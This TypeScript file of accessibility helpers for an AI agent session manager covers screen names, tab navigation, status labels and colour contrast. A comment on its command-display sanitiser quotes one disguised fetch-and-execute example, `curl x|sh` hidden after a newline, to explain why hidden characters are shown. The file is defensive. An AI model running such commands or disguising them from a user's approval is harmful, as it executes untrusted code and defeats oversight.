// Pure helpers for screen readers and the keyboard (NFR-A11Y-001, NFR-A11Y-002,
// NFR-A11Y-003), kept apart from the components so they can be tested.

const SCREEN_NAMES: Record<string, string> = {
  attention: "Needs attention",
  board: "Board",
  compare: "Compare runs",
  environments: "Environments",
  import: "Import from Claude Code",
  mcp: "MCP servers",
  new: "New session",
  onboarding: "Getting started",
  optimizers: "Token optimizers",
  profiles: "Profiles",
  providers: "Providers",
  rules: "Permission rules",
  schedules: "Schedules",
  settings: "Settings",
  skills: "Skills",
  usage: "Usage",
};

// screenName is what the window's title and an announcement call a screen; a
// session goes by its own title.
export function screenName(kind: string, sessionTitle?: string): string {
  if (kind === "session") return sessionTitle || "Session";
  return SCREEN_NAMES[kind] ?? "";
}

// tabAfterKey says which tab a key moves focus to, or -1 for a key that moves
// nothing. Moving does not select: opening the Terminal tab starts a shell, so
// choosing one takes Return or Space, as on any button.
export function tabAfterKey(key: string, index: number, count: number): number {
  if (count === 0) return -1;
  switch (key) {
    case "ArrowRight":
      return (index + 1) % count;
    case "ArrowLeft":
      return (index - 1 + count) % count;
    case "Home":
      return 0;
    case "End":
      return count - 1;
  }
  return -1;
}

// toolStatusLabel says in words what a tool card's coloured dot shows.
export function toolStatusLabel(status: string, waiting: boolean): string {
  if (waiting) return "Waiting for your approval:";
  switch (status) {
    case "completed":
      return "Done:";
    case "failed":
      return "Failed:";
    case "in_progress":
      return "Running:";
    case "pending":
      return "Pending:";
  }
  return "";
}

// pickLabel announces the highlighted entry of a picker whose focus stays in
// the message box, where a screen reader would not hear it change.
export function pickLabel(name: string, index: number, count: number): string {
  return count > 0 ? `${name}, ${index + 1} of ${count}` : "";
}

// Colour contrast, as WCAG 2 defines it, for the theme's tokens.
function luminance(hex: string): number {
  let h = hex.replace("#", "");
  if (h.length === 3) h = [...h].map((c) => c + c).join("");
  const [r, g, b] = [0, 2, 4].map((i) => {
    const v = parseInt(h.slice(i, i + 2), 16) / 255;
    return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4;
  });
  return 0.2126 * r + 0.7152 * g + 0.0722 * b;
}

export function contrast(a: string, b: string): number {
  const [x, y] = [luminance(a), luminance(b)];
  return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05);
}

// visibleCommand keeps what a command does on screen. A newline in HTML reads as a
// space, so `echo ok #\ncurl x|sh` would look like a comment, and bidi and
// zero-width characters can reorder or hide the rest. Each is shown as what it is.
export function visibleCommand(s: string): string {
  return s
    .replace(/\r\n|\n|\r/g, " ⏎ ")
    .replace(/\t/g, " ⇥ ")
    .replace(/[\p{Cc}\p{Cf}\u2028\u2029]/gu, (c) => `⟦U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, "0")}⟧`);
}
